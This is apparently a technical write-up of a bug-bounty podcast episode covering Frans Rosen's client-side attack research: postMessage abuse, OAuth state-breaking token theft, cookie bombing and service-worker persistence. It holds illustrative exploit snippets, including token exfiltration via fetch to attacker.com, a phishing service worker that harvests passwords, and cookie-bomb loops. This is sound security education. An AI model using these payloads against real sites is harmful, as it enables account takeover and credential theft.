# Episode 45 — The OG Bug Bounty King: Frans Rosen — Full Technical Breakdown

## WHO IS FRANS ROSEN?

Frans Rosen is one of the founding figures of modern bug bounty and client-side security research. He co-founded **Detectify** (a web security scanner) after hiring two young security enthusiasts — Mattias Karlsson and Fredrik Alnrute — into his development company. He holds the record for most MVH (Most Valuable Hacker) awards at HackerOne live hacking events. His research spans from 2014 to the present day, with landmark contributions including the discovery of S3 bucket takeovers, pioneering postMessage exploitation tooling, AppCache/Service Worker abuse chains, OAuth "Dirty Dancing" token theft, and middleware misconfiguration exploitation. His published work on Detectify's blog remains mandatory reading for client-side security researchers — much of it written in 2017-2018 still yields bugs today.

---

## PART 1 — PostMessage Exploitation & Tooling

### Technique 1 — PostMessage Listener Discovery via Chrome Extension

Frans built the **PostMessage Tracker** Chrome extension because Chrome DevTools only shows event listeners for the currently selected iframe. If a listener is registered five iframes deep, you will never see it through DevTools global event listeners.

**Why it works:** The extension hooks into all frames recursively and increments a counter badge for every `message` event listener registered, regardless of iframe depth.

**Where to look:**
- Payment provider iframes (Stripe, Adyen, Braintree, etc.) — they heavily use postMessage for cross-origin communication
- OAuth popup windows communicating results back to the opener
- Upload dialogs and document preview sandboxes
- Any popup/iframe flow where data appears on the parent without an HTTP request

```javascript
// DevTools only shows listeners on the SELECTED frame.
// If you have:
//   main page
//     -> iframe A
//         -> iframe B
//             -> iframe C (has addEventListener("message", ...))
//
// You will NOT see that listener in DevTools unless you
// manually select iframe C's context. The extension catches ALL of them.
```

**Practical workflow:**
1. Install PostMessage Tracker
2. Browse the target application — watch the badge counter
3. Trigger specific actions (upload, login, payment) — see if new listeners register
4. For each listener, inspect whether it checks `event.origin`

---

### Technique 2 — Action-Triggered PostMessage Listeners

Most hunters only look for postMessage listeners that exist on page load. Frans found that the most interesting listeners are **registered dynamically by user actions** — clicking "Upload Document," initiating a payment, or opening a settings modal.

**Why it matters:** Static code analysis and page-load-only scans will miss these entirely.

```
+---------------------------+
| User clicks "Upload Doc"  |
+---------------------------+
            |
            v
+---------------------------+
| JS registers new listener |
| addEventListener("message"|
|   , handleUploadData)     |
+---------------------------+
            |
            v
+---------------------------+
| Sandbox iframe posts back |
| document data via         |
| postMessage               |
+---------------------------+
```

**Attack flow:**
```javascript
// 1. Victim clicks "Upload Document" on target.com
// 2. Target registers a listener:
window.addEventListener("message", function(e) {
  // No origin check!
  let docData = e.data;
  processDocument(docData);
});

// 3. Attacker (if they can iframe or open target.com):
targetWindow.postMessage({
  type: "documentData",
  content: "<img src=x onerror=alert(document.cookie)>"
}, "*");
```

**Where to apply:** Any application with dynamic UI panels — upload flows, inline editors, payment modals, chat widgets, embedded document viewers.

---

### Technique 3 — Unwrapping PostMessage Listener Wrappers

Many applications wrap their event listeners through monitoring libraries — **New Relic**, **Rollbar**, **Sentry**, and **jQuery** all add wrapper functions around native listeners. When you inspect `getEventListeners(window)` in DevTools, you see the wrapper, not the real handler.

**Why it works:** Frans's PostMessage Tracker extension can **unwrap** these wrappers to reveal the actual function body, which is where you find the origin check (or lack thereof) and the sink.

```javascript
// What DevTools shows you:
function nrWrapper(e) {
  // New Relic instrumentation
  return originalHandler.apply(this, arguments);
}

// What you NEED to see (the actual handler):
function originalHandler(e) {
  if (e.data.action === "setConfig") {
    document.getElementById("output").innerHTML = e.data.html;
    //                                            ^^^^^^^^^^
    //                              SINK: innerHTML with attacker-controlled data
  }
}
```

**Practical tip:** If using DevTools manually, look for `.listener` or `.__wrapped__` properties on the wrapper function. Or use PostMessage Tracker which does this automatically.

---

### Technique 4 — MessagePort Exploitation

Frans highlighted **MessagePort** as a growing and under-researched attack surface. Unlike regular postMessage (which is broadcast-style), MessagePorts create a dedicated communication channel between two endpoints.

**Why it works:** Developers often assume that because a port was established between two trusted endpoints, anything received on that port is trusted — so they skip origin validation.

```javascript
// Normal postMessage flow:
// window A posts to window B with targetOrigin
windowB.postMessage("data", "https://trusted.com");

// MessagePort flow:
// 1. Window A creates a channel
const channel = new MessageChannel();

// 2. Window A sends port2 to Window B via postMessage
windowB.postMessage("init", "https://trusted.com", [channel.port2]);

// 3. Now Window A and B have a private channel:
channel.port1.onmessage = function(e) {
  // Developers often trust anything on this port
  // because "we established it ourselves"
  eval(e.data.code); // No validation!
};
```

**The key trick — port juggling:**
```
+------------------+     port2     +------------------+
|   Window A       |  ---------->  |   Window B       |
|   (victim app)   |               |   (trusted frame)|
+------------------+               +------------------+
                                          |
                                   attacker steals port2
                                          |
                                          v
                                   +------------------+
                                   |   Attacker Frame |
                                   |   (receives all  |
                                   |    messages on    |
                                   |    the port)      |
                                   +------------------+
```

A message port can be **transferred between iframes**. If an attacker can intercept the port handoff (e.g., via an XSS in a sandbox, or by winning a race), they receive all subsequent messages on that port.

**Where to apply:** Any application using `MessageChannel`, `MessagePort`, or `SharedWorker` — search JS files for these APIs.

---

### Technique 5 — Client-Side Race Conditions via PostMessage

Frans identified **client-side race conditions with postMessage** as a largely unexplored area with significant bug potential.

**The JSON.parse timing trick:** If one window parses incoming postMessage data with `JSON.parse()` (computationally expensive for large objects), while the attacker uses simple `substring()` extraction, the attacker can win the race.

```javascript
// SCENARIO: Window A sends a postMessage containing a token.
// Window B (legitimate) receives it and uses JSON.parse().
// Attacker also receives it and uses substring().

// Window B (legitimate handler — SLOW):
window.addEventListener("message", function(e) {
  let data = JSON.parse(e.data); // SLOW for large payloads
  let token = data.auth.token;
  // ... processes token
});

// Attacker (FAST):
window.addEventListener("message", function(e) {
  // Skip JSON.parse entirely — just extract what we need
  let raw = e.data;
  let tokenStart = raw.indexOf('"token":"') + 9;
  let tokenEnd = raw.indexOf('"', tokenStart);
  let token = raw.substring(tokenStart, tokenEnd);

  // Race won — send token to attacker server BEFORE
  // the legitimate handler processes it
  fetch("https://attacker.com/steal?t=" + token);
});
```

**Attack flow:**
```
+------------------+
| OAuth Provider   |
| sends postMessage|
| with auth code   |
+------------------+
        |
        | postMessage (broadcast)
        v
+-------+--------+----------+
|                 |          |
v                 v          v
Legitimate     Attacker    Attacker
Handler        Frame 1     Frame 2
(JSON.parse    (substring  (sends stolen
 = SLOW)        = FAST)     token to C2)
```

**Where to apply:** Any multi-window OAuth flow, any SDK that broadcasts tokens via postMessage, any payment callback flow.

---

### Technique 6 — Sending Non-String Objects via PostMessage

PostMessage can transmit more than just strings. Frans noted you can send **Blob**, **RegExp**, **File**, and other structured objects. If the receiver does type checking like `if (typeof e.data === "string")`, sending an object bypasses that check entirely.

```javascript
// Target's listener:
window.addEventListener("message", function(e) {
  if (typeof e.data === "string") {
    // "Safe" path — sanitized
    safeProcess(e.data);
  } else {
    // "Object" path — maybe less sanitized
    processConfig(e.data);  // <-- attacker sends an object here
  }
});

// Attacker sends a Blob instead of a string:
let maliciousBlob = new Blob(["<script>alert(1)</script>"], {type: "text/html"});
targetWindow.postMessage(maliciousBlob, "*");

// Or a RegExp:
targetWindow.postMessage(/.*/, "*");

// Or a structured object with unexpected properties:
targetWindow.postMessage({
  __proto__: { isAdmin: true },
  action: "updateProfile"
}, "*");
```

**Where to apply:** Any postMessage listener that branches on `typeof` or does type-specific processing. Look for handlers that call `.toString()` on received data — different object types produce different `.toString()` outputs.

---

### Technique 7 — PostMessage Relay/Proxy Gadgets

Frans described **relay gadgets** — postMessage listeners that act as proxies, forwarding received messages to child iframes. These are exploitable in OAuth `web_message` response mode flows.

```
+--------------------+      postMessage       +--------------------+
| OAuth Provider     |  ------------------>   | Target Origin      |
| (sends auth token  |                        | (any page — web_   |
|  via web_message)  |                        |  message normalizes|
+--------------------+                        |  to origin)        |
                                              +--------------------+
                                                      |
                                              relay gadget forwards
                                              message to child iframe
                                                      |
                                                      v
                                              +--------------------+
                                              | Child Iframe       |
                                              | (sandbox/CDN/etc)  |
                                              | attacker controls  |
                                              +--------------------+
                                                      |
                                                      v
                                              Auth token leaked!
```

**Why it works:** When OAuth uses `response_mode=web_message`, the auth provider sends the token via postMessage to the **origin** (not a specific path). Any page on that origin can receive it. If any page on that origin has a postMessage relay gadget, the token can be forwarded to an attacker-controlled context.

```javascript
// Relay gadget found on target.com/widget.html:
window.addEventListener("message", function(e) {
  // Forwards ALL messages to child iframe
  document.getElementById("sandbox").contentWindow.postMessage(e.data, "*");
});

// Attacker exploitation:
// 1. Open target.com/widget.html (which has the relay gadget)
// 2. Initiate OAuth with response_mode=web_message
// 3. OAuth provider sends token to target.com origin
// 4. widget.html relay forwards it to sandbox iframe
// 5. If attacker controls sandbox content -> token stolen
```

**Where to apply:** Large applications with many iframes and widget embedding — search for `contentWindow.postMessage` patterns that relay without filtering.

---

## PART 2 — OAuth "Dirty Dancing" — Breaking State for Token Theft

### Technique 8 — Intentional OAuth State Breaking

This is the core of Frans's landmark "Dirty Dancing" research. The OAuth `state` parameter is a CSRF protection — the app generates it, sends it through the OAuth flow, and verifies it matches when the flow returns. **By intentionally breaking the state, the attacker forces an error condition** that exposes the authorization code to alternative leak channels.

**Why it works:** The state validation happens **before** the code exchange. When validation fails, the code is never consumed — but it is still present in the URL (query or fragment). Error pages may leak that URL through postMessage listeners, analytics trackers, referer headers, or other side channels.

```
NORMAL OAUTH FLOW:
==================

User -> App: "Log me in"
App -> User: redirect to OAuth provider
  URL: https://oauth.provider.com/auth?
       client_id=X&
       redirect_uri=https://app.com/callback&
       state=RANDOM_ABC&         <-- App generates this
       response_type=code

User -> OAuth Provider: authenticates
OAuth Provider -> User: redirect back
  URL: https://app.com/callback?
       code=AUTH_CODE_123&
       state=RANDOM_ABC          <-- Must match

App: verifies state == RANDOM_ABC -> SUCCESS
App: exchanges code for token



DIRTY DANCING ATTACK:
=====================

Attacker -> Victim: sends crafted link
  URL: https://oauth.provider.com/auth?
       client_id=X&
       redirect_uri=https://app.com/callback&
       state=ATTACKER_STATE&     <-- Attacker's state (wrong)
       response_type=code

Victim -> OAuth Provider: authenticates
OAuth Provider -> Victim: redirect back
  URL: https://app.com/callback?
       code=VICTIM_AUTH_CODE&    <-- Valid code for VICTIM
       state=ATTACKER_STATE      <-- Wrong state!

App: verifies state != expected -> FAILS
App: shows error page / redirects to error URL
  BUT: the code is STILL in the URL/fragment

Error page leaks URL via:
  - postMessage listener
  - analytics/tracking pixel
  - Referer header on outbound link
  - window.name transfer
  - Any other gadget

Attacker: captures VICTIM_AUTH_CODE
Attacker: exchanges code using THEIR state (ATTACKER_STATE)
  -> redirect_uri matches (same callback URL)
  -> code is valid
  -> Attacker gets victim's access token
  -> FULL ACCOUNT TAKEOVER
```

**Critical insight:** The redirect_uri validation still passes because the victim lands on the correct callback URL. Only the state mismatches, so the code is valid but unconsumed.

**Where to apply:** Every OAuth implementation. Test by modifying the `state` parameter and observing what happens on the error/failure page.

---

### Technique 9 — OAuth Response Type / Response Mode Switching

Different OAuth response types dictate **where** the sensitive data appears in the redirect. Frans discovered that switching between response types changes the attack surface significantly.

| Response Type | Data Location | Leak Risk |
|---|---|---|
| `code` | Query parameter (`?code=X`) | Referer header, server logs |
| `token` | Fragment (`#access_token=X`) | Client-side only, postMessage |
| `id_token` | Fragment (`#id_token=X`) | Client-side only, postMessage |
| `code` + `response_mode=fragment` | Fragment | Client-side only |
| `code` + `response_mode=web_message` | PostMessage | Any page on origin |
| `token` + `response_mode=form_post` | POST body | Server-side reflection |

```javascript
// ATTACK: Force response_mode=web_message
// Instead of:
// https://oauth.provider.com/auth?response_type=code&redirect_uri=...

// Try:
// https://oauth.provider.com/auth?response_type=token&response_mode=web_message&redirect_uri=...

// Now the token is sent via postMessage to the origin.
// ANY page on that origin with a postMessage listener can receive it.
```

**Google's form_post quirk (discovered by Frans):** Google allows you to enable `response_mode=form_post` which submits the token as a POST request. In this mode, **the redirect_uri validation is relaxed** — you can select any URL on the website, including subdomains.

```
Attacker crafts OAuth URL:
  https://accounts.google.com/o/oauth2/auth?
    response_type=token&
    response_mode=form_post&
    redirect_uri=https://any-subdomain.target.com/any-path&
    client_id=...

OAuth provider POSTs the token to the specified URL.
If attacker can read that POST data (via reflection, logging, etc.)
-> Token stolen.
```

**Gadgets for reading POST data:**
- Pages that reflect POST parameters in the response body
- Logging endpoints (like `scripts.google.com` for Google's own domain)
- Debug/error pages that dump request data
- Analytics endpoints that log full request bodies

**Where to apply:** Any OAuth provider that supports multiple response modes. Test each mode and observe where data lands.

---

### Technique 10 — OAuth Token Leak via window.name Transfer

Frans described a Reddit bug where the application used `window.name` to transfer data to a sandbox. The sandbox had known XSS vectors (e.g., user-controlled Google Tag Manager), and because the auth payload was in `window.name`, it could be read cross-origin.

```javascript
// Reddit's flow:
// 1. Main window sets window.name with payload containing fragment data
window.name = JSON.stringify({
  url: window.location.href,  // Contains #access_token=...
  payload: someData
});

// 2. Redirects to sandbox domain
window.location = "https://sandbox.reddit.com/render";

// 3. Sandbox reads window.name
let data = JSON.parse(window.name);
let url = data.url; // Contains the OAuth fragment!

// ATTACK:
// If attacker can run script on sandbox (e.g., via GTM injection):
let stolen = JSON.parse(window.name);
fetch("https://attacker.com/steal?url=" + encodeURIComponent(stolen.url));
```

**Why it works:** `window.name` persists across navigations, even cross-origin. If a window sets its name and then navigates to another origin, the new page can read the name.

```
+-------------------+    window.name = "secret"    +-------------------+
| Origin A          | ---------------------------> | Origin B          |
| (sets window.name)|                              | (reads            |
|                   |                              |  window.name)     |
+-------------------+                              +-------------------+
                                                   Can read "secret"!
```

**Where to apply:** Any application that uses `window.name` for data transfer. Search for `window.name =` assignments in JavaScript files.

---

### Technique 11 — Out-of-Band OAuth Token Exfiltration via Tracking Services

Frans described a class of gadgets where OAuth tokens leak not through postMessage, but through **third-party tracking and analytics services**. If the error page (after state-breaking) loads a tracking pixel or analytics SDK, the full URL (with the auth code) may be sent to a third-party service that the attacker can access.

```
ATTACK FLOW:
============

1. Attacker breaks OAuth state -> victim lands on error page
2. Error page has Google Analytics / Mixpanel / Segment / etc.
3. Tracker records the full page URL: /callback?code=VICTIM_CODE&state=X
4. If attacker controls the analytics property (or can access the same one):
   -> Read the code from analytics dashboard/API

Alternative: Custom tracking services with API access
   -> Company uses internal tracking service
   -> Tracking service has an API
   -> Attacker discovers API key in client-side JS
   -> Queries API for recent pageviews
   -> Finds victim's auth code in URL logs
```

```javascript
// Example: Page has a tracker that sends full URL
// analytics.js on the error page:
(function() {
  var img = new Image();
  img.src = "https://tracker.company.com/pixel?" +
    "url=" + encodeURIComponent(window.location.href) +
    "&uid=" + getCookie("tracking_id");
  // window.location.href contains ?code=VICTIM_AUTH_CODE
})();

// If attacker can query tracker.company.com's API:
// GET https://tracker.company.com/api/pageviews?url_contains=callback
// -> Returns list of URLs including victim's auth code
```

**Where to apply:** After state-breaking, examine what third-party scripts load on the error page. Check if any of them log the full URL. Check if the same tracking property is reused across the application (attacker may be able to inject their own tracking ID via a separate vulnerability like the Pixiv GTM bug).

---

## PART 3 — Cookie Bombing / Cookie Stuffing for DoS and Exploitation Chains

### Technique 12 — Cookie Stuffing to Force Errors

Learned from **file descriptor's** research, Frans used cookie stuffing to force server-side errors. By filling the cookie jar for a specific domain, subsequent requests exceed the server's maximum header size, causing 400/413 errors.

```javascript
// Cookie bomb — set many large cookies for the target domain
// Run this from any page on the same domain (or parent domain):
for (let i = 0; i < 100; i++) {
  document.cookie = `bomb${i}=${"A".repeat(4000)}; path=/; domain=.target.com`;
}

// Now ANY request to target.com will include ~400KB of cookies
// Most servers reject requests with headers > 8KB-16KB
// Result: 400 Bad Request or 413 Request Entity Too Large
```

**Why it works:** Cookies are sent automatically with every request. If the total cookie size exceeds the server's header limit, the server returns an error before any application logic runs. This is a **client-side denial of service** that persists until the victim clears cookies.

**Chaining with other techniques:**
```
COOKIE BOMB + SERVICE WORKER = Persistent XSS
COOKIE BOMB + AppCache Fallback = Content Injection
COOKIE BOMB + OAuth = Force Re-authentication (steal creds via SW)
```

---

### Technique 13 — Cookie Bomb + AppCache Fallback = Content Hijacking

Frans and Mattias discovered that combining cookie stuffing with HTML5 **AppCache** (Application Cache) manifests allows serving attacker-controlled content when the real server becomes unreachable.

```
ATTACK CHAIN:
=============

1. Attacker has XSS on sandbox domain (dl.dropboxusercontent.com)
   via XML file upload on legacy Dropbox account

2. XML file includes AppCache manifest reference:
   <html manifest="manifest.appcache">

3. Manifest specifies fallback pages:
   CACHE MANIFEST
   FALLBACK:
   / /attacker-controlled-page.html

4. Attacker triggers cookie bomb on target domain
   -> Server returns errors for all requests

5. AppCache kicks in: "Server unreachable, use fallback"
   -> Serves attacker's page instead of real content

6. Victim sees attacker-controlled page on the real domain
   -> Phishing, credential theft, token theft
```

```html
<!-- attacker's XML file on dl.dropboxusercontent.com/u/ATTACKER_ID/evil.xml -->
<?xml version="1.0"?>
<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" manifest="manifest.txt">
<body>
<script>
// Cookie bomb the target domain
for (var i = 0; i < 100; i++) {
  document.cookie = "bomb" + i + "=" + "A".repeat(4000) +
    "; path=/; domain=.dropboxusercontent.com";
}
</script>
</body>
</html>

<!-- manifest.txt (served as text/plain, AppCache doesn't care): -->
<!--
CACHE MANIFEST
FALLBACK:
/ /u/ATTACKER_ID/phishing-page.html
-->
```

**Limitation:** AppCache is deprecated in modern browsers. However, the concept transfers to **Service Workers** which are the modern replacement.

---

## PART 4 — Service Workers for Persistent Client-Side Exploitation

### Technique 14 — Service Worker Installation for Persistent XSS

Service Workers are the modern replacement for AppCache and provide **persistent code execution in the browser** that survives page reloads and even browser restarts. Frans discussed chaining Service Workers with file uploads or subdomain takeovers.

```javascript
// service-worker.js (hosted on attacker-controlled bucket/subdomain):
self.addEventListener('fetch', function(event) {
  // Intercept ALL requests on this origin
  if (event.request.url.includes('/login')) {
    // Serve a phishing page instead of the real login
    event.respondWith(
      new Response(
        '<html><body>' +
        '<form action="https://attacker.com/steal" method="POST">' +
        '<input name="user" placeholder="Username">' +
        '<input name="pass" type="password" placeholder="Password">' +
        '<button>Login</button></form></body></html>',
        { headers: { 'Content-Type': 'text/html' } }
      )
    );
  } else {
    // Pass everything else through normally
    event.respondWith(fetch(event.request));
  }
});
```

**Installation via XSS:**
```javascript
// If you have XSS on the target:
navigator.serviceWorker.register('/path/to/sw.js', {
  scope: '/'  // Controls all paths under /
}).then(function(reg) {
  console.log('SW registered — persistent XSS achieved');
});
```

**Service-Worker-Allowed header:** Without this header, the SW scope is limited to the directory where the SW file is hosted. With the header, you can set scope to `/` from any path.

```
Without header:
  SW at /js/sw.js -> scope limited to /js/

With header "Service-Worker-Allowed: /":
  SW at /js/sw.js -> scope expanded to /
```

---

### Technique 15 — CRLF Injection + Service Worker Installation

Frans and Justin Gardner brainstormed this chain during the podcast: if you find a **CRLF injection** (response header injection), you can forge the `Service-Worker-Allowed` header AND serve a fake service worker body in a single response split.

```
ATTACK CHAIN:
=============

1. Find CRLF injection in response headers:
   GET /page?param=value%0d%0aService-Worker-Allowed:%20/

2. First CRLF: inject Service-Worker-Allowed header
   HTTP/1.1 200 OK
   Content-Type: text/javascript
   Service-Worker-Allowed: /         <-- INJECTED

3. Second CRLF pair: inject response body with SW code

   self.addEventListener('fetch', function(e) {
     // intercept and modify all requests
   });

4. Register this URL as a service worker:
   navigator.serviceWorker.register('/page?param=value%0d%0a...')

5. Service worker installed with scope "/"
   -> Persistent XSS on entire origin
   -> Survives page reloads and browser restarts
   -> Can intercept login forms to steal plaintext passwords
```

**Escalation to plaintext password theft:**
```
1. Install service worker via CRLF
2. Cookie bomb a specific auth-related path (e.g., /api/auth/token)
3. User's session becomes invalid (cookie-bombed path fails)
4. User is forced to re-authenticate
5. Service worker intercepts the login form submission
6. Extract plaintext username + password
7. Full account takeover with credentials (not just session)
```

---

### Technique 16 — Service Worker + Subdomain Takeover for Persistence

Frans noted that XSS on a sandbox domain (e.g., an unclaimed S3 bucket) is normally low impact. But installing a **Service Worker** on that sandbox domain converts it into persistent XSS that can intercept all future requests to that domain.

```
LOW IMPACT (XSS on sandbox):
  attacker controls content on cdn.target.com
  -> Can show phishing page (requires victim to visit)
  -> Session cookies are on target.com, not cdn.target.com
  -> Impact: Low

HIGH IMPACT (XSS + Service Worker on sandbox):
  attacker registers SW on cdn.target.com
  -> SW intercepts ALL future requests to cdn.target.com
  -> If target.com loads resources from cdn.target.com:
     scripts, images, CSS, etc.
  -> SW can modify those resources
  -> Modified JS executes in target.com context via <script src="cdn...">
  -> Impact: Critical (persistent, no user interaction after first visit)
```

---

### Technique 17 — Service Worker Abuse via OfCores (Truffle Security)

Frans and Justin referenced **OfCores** by Truffle Security — a tool that uses a Service Worker running in the background to exploit vulnerable CORS configurations. The SW keeps running even after the victim navigates away from the attacker's page.

```
NORMAL CORS EXPLOIT:
  Victim visits attacker.com -> JS reads data from target.com via CORS
  Victim leaves attacker.com -> Attack stops

WITH SERVICE WORKER:
  Victim visits attacker.com -> SW installed
  Victim leaves attacker.com -> SW KEEPS RUNNING
  SW continues making CORS requests to target.com in background
  -> More time to extract data
  -> Can wait for specific conditions
  -> Persistent exfiltration
```

**Where to apply:** When you find a misconfigured CORS policy but the attack window is too short for a single page visit.

---

## PART 5 — CloudFront Trailing Dot Domain Hijacking

### Technique 18 — FQDN Trailing Dot Takeover + Cookie Theft

Frans discovered that adding a trailing dot to a domain (the FQDN form, e.g., `example.com.`) caused CloudFront to return a "distribution not found" error. He could then claim that FQDN domain in his own CloudFront distribution.

```
DNS CONCEPT:
  example.com   = shorthand
  example.com.  = Fully Qualified Domain Name (FQDN)
  Both should resolve to the same IP.

CLOUDFRONT BUG:
  1. target.com is served by CloudFront
  2. target.com. (with dot) returns "no distribution found"
  3. Attacker creates CloudFront distribution for target.com.
  4. Attacker now controls content served at target.com.
  5. CloudFront has cookie logging -> attacker gets victim cookies

WHY VICTIMS VISIT target.com.:
  In emails: "Please visit target.com."
  The period at the end of the sentence becomes part of the URL!
  Email clients linkify "target.com." including the dot.
  -> No user interaction / social engineering needed
```

```
+------------------+     "Visit target.com."     +------------------+
| Email client     | --------------------------> | Victim browser   |
| linkifies URL    |                             | navigates to     |
| including the    |                             | target.com.      |
| trailing dot     |                             | (with dot)       |
+------------------+                             +------------------+
                                                        |
                                                        v
                                                 +------------------+
                                                 | CloudFront       |
                                                 | serves ATTACKER's|
                                                 | distribution     |
                                                 +------------------+
                                                        |
                                                        v
                                                 Cookies sent to
                                                 attacker's CF
                                                 distribution
                                                 (same domain =
                                                 cookies apply)
```

**Critical detail:** Cookies set for `target.com` are also sent to `target.com.` because browsers treat FQDN as equivalent. CloudFront's cookie logging captured all these cookies, giving the attacker session tokens.

**Bypass:** CloudFront had a client-side validation preventing dots in the CNAME field. Frans bypassed it by intercepting the gRPC request in Burp and adding the dot server-side.

**Status:** CloudFront now requires domain ownership validation. But the trailing dot concept applies to other CDNs/services that may not.

---

## PART 6 — Middleware Misconfigurations (NGINX Proxy Pass Exploits)

### Technique 19 — NGINX Proxy Pass Path Manipulation for S3 Backend Hijacking

Frans's "Middleware Everywhere" research showed how NGINX `proxy_pass` misconfigurations allow attackers to manipulate which backend resource is accessed by injecting escape characters into URLs.

```nginx
# Vulnerable NGINX config:
location /assets/ {
    proxy_pass https://company-bucket.s3.amazonaws.com/;
}

# Normal request:
# GET /assets/image.png -> proxied to s3://company-bucket/image.png

# ATTACK: inject newlines/escape chars to change the backend path
# GET /assets/..%2F..%2Fattacker-bucket/evil.js
# -> proxied to s3://attacker-bucket/evil.js
```

**Chaining with Service Workers:**
```
1. Exploit NGINX proxy_pass to serve attacker-controlled JS
   from attacker's S3 bucket on the target's domain
2. The response comes from target.com (legitimate origin)
3. Register the served file as a Service Worker
4. If you can inject Service-Worker-Allowed header via S3 website:
   -> Persistent XSS on target.com
```

**Where to apply:** Any application using NGINX reverse proxy with `proxy_pass` to cloud storage. Test path traversal with various encodings: `%2F`, `%252F`, `..`, URL-encoded newlines.

---

## PART 7 — Reconnaissance & Analysis Methodology for Client-Side Bugs

### Technique 20 — Burp XML Export + Word Extraction for Parameter Taxonomy

Frans exports all requests for a target from Burp Suite into XML, then extracts all parameter names, sorts them, and makes them unique. This reveals naming inconsistencies that indicate different developers/codebases.

```bash
#!/bin/bash
# Frans's approach (conceptual — he has a custom "unpack burp state" script):

# 1. Export Burp items as XML
# 2. Extract request bodies and URLs
# 3. Pull all parameter names
# 4. Sort and unique them

# Example: extracting parameter names from Burp XML export
xmllint --xpath '//item/request' burp_export.xml | \
  grep -oP '[?&]([a-zA-Z_]+)=' | \
  sed 's/[?&]//; s/=//' | \
  sort -u > params.txt

# Look for naming inconsistencies:
# intentId       <- camelCase (Dev Team A)
# intent_id      <- snake_case (Dev Team B)
# IntentID       <- PascalCase (Dev Team C)
#
# Different naming = different implementations = different bug surfaces
```

**Why it works:** When two parameter names refer to the same concept but use different naming conventions (e.g., `intentId` vs `intent_id`), it means different developers or teams implemented them. If `intentId` is properly validated, `intent_id` may not be. This is an **indicator of inconsistent security implementation**.

---

## MASTER SUMMARY TABLE

| # | Technique | Category | Where to Apply |
|---|-----------|----------|----------------|
| 1 | PostMessage Tracker Extension | PostMessage | Any web app — install and browse |
| 2 | Action-Triggered PostMessage Listeners | PostMessage | Upload flows, payment modals, settings panels |
| 3 | Unwrapping PostMessage Wrappers (New Relic, Rollbar, jQuery) | PostMessage | Apps using monitoring/analytics libraries |
| 4 | MessagePort Exploitation + Port Juggling | PostMessage | Apps using MessageChannel/SharedWorker |
| 5 | Client-Side Race Conditions (JSON.parse vs substring) | PostMessage / Race | Multi-window OAuth, SDK token broadcasts |
| 6 | Non-String Object Injection via PostMessage (Blob, RegExp) | PostMessage | Any postMessage listener with type branching |
| 7 | PostMessage Relay/Proxy Gadgets | PostMessage / OAuth | OAuth web_message mode, widget-heavy apps |
| 8 | OAuth State Breaking ("Dirty Dancing") | OAuth | Every OAuth implementation |
| 9 | OAuth Response Type/Mode Switching | OAuth | OAuth providers supporting multiple modes |
| 10 | window.name Cross-Origin Data Leak | Data Leak | Apps using window.name for IPC (e.g., Reddit) |
| 11 | Out-of-Band Token Exfil via Analytics/Trackers | OAuth / Data Leak | Error pages with third-party tracking scripts |
| 12 | Cookie Stuffing / Cookie Bombing | Cookie | Any domain — force 400 errors |
| 13 | Cookie Bomb + AppCache Fallback Hijacking | Cookie / Cache | Legacy apps supporting AppCache |
| 14 | Service Worker Installation for Persistent XSS | Service Worker | Any origin with XSS + SW-compatible path |
| 15 | CRLF Injection + Service Worker Installation | Service Worker / Injection | Apps with header injection vulnerabilities |
| 16 | Service Worker + Subdomain Takeover | Service Worker / Takeover | Sandbox domains, CDN subdomains |
| 17 | Service Worker Background CORS Exploitation (OfCores) | Service Worker / CORS | Misconfigured CORS policies |
| 18 | CloudFront FQDN Trailing Dot Takeover | Domain Takeover | CDN-fronted domains (CloudFront, etc.) |
| 19 | NGINX proxy_pass Backend Path Manipulation | Middleware | NGINX reverse proxies to cloud storage |
| 20 | Burp XML Parameter Taxonomy Extraction | Recon | Any target — parameter naming analysis |

---

## KEY QUOTES WORTH REMEMBERING

> "I've almost made it a challenge to myself to write pseudo code of how something is implemented so I can make a black box a white box." — Frans Rosen, on reverse-engineering application logic

> "PostMessage listeners that are not initiated from start, but by action — those are the most common ones I find nowadays." — Frans Rosen, on dynamic postMessage attack surface

> "The golden nugget in the extension was unpacking the wrappers — New Relic, Rollbar, jQuery — so you can get to the real function that is actually being triggered." — Frans Rosen, on PostMessage Tracker

> "Client-side race conditions with postMessage — I think I was early on with it, but I think there are much more places to investigate that might be similarly vulnerable." — Frans Rosen, flagging an under-researched area

> "Breaking the state intentionally... the code will never be used because the validation of state is before, and then you can take it and rerun the same code and it will work." — Frans Rosen, on Dirty Dancing

> "The out-of-band gadget has huge potential for research — what happens if you break the state, you end up on the page, it sends it over to tracking service X and Y, and that tracking service has some form of history or API." — Frans Rosen, on token exfiltration via analytics

> "You can juggle that message port wherever you want, which is kind of funny — it's basically like a socket that shuffles data." — Frans Rosen, on MessagePort abuse

> "Cookies are working both on the FQDN and the regular domain. So if you had cookies, signed into PayPal, and went to car.com-dot, I would get your cookies." — Frans Rosen, on trailing dot cookie theft

> "There's a bunch of those like 'if this is not a string' kind of bugs that you can find just because you're sending a completely different object with postMessage." — Frans Rosen, on non-string postMessage payloads

---

## RESOURCES MENTIONED

- **PostMessage Tracker** — Frans Rosen's Chrome extension for discovering postMessage listeners across all iframe depths (GitHub)
- **Attacking Modern Web Technologies** — Frans Rosen's 2018 talk (AppCache, Service Workers, postMessage, S3 policies)
- **Account Hijacking Using Dirty Dancing in Sign-In OAuth Flows** — Detectify blog (OAuth state-breaking, response mode switching, token leak gadgets)
- **Middleware Everywhere and Lots of Misconfigurations to Fix** — Detectify blog (NGINX proxy_pass exploits)
- **S3 Bucket Finder / Bucket Disclosure Tool** — Frans Rosen's tool for decloaking S3 bucket names via error-based techniques
- **Google Cloud Storage Decloaking Tool** — 7 decloaking methods (by Frans + Mattias, unreleased at time of recording)
- **Live Hacking Like an MVH** — Frans Rosen's talk on live hacking event methodology
- **Bounty Please** — Frans's bash tool for rapid bug submission at live hacking events
- **OfCores** — Truffle Security's tool using Service Workers to exploit CORS misconfigurations
- **CloudFront Hijacking (2016)** — Detectify blog on trailing dot FQDN takeover
- **S3 Bucket Takeover (2014)** — Original Detectify blog that started the subdomain takeover movement
- **file descriptor's research** — Cookie stuffing / cookie bombing techniques (referenced by Frans as inspiration)
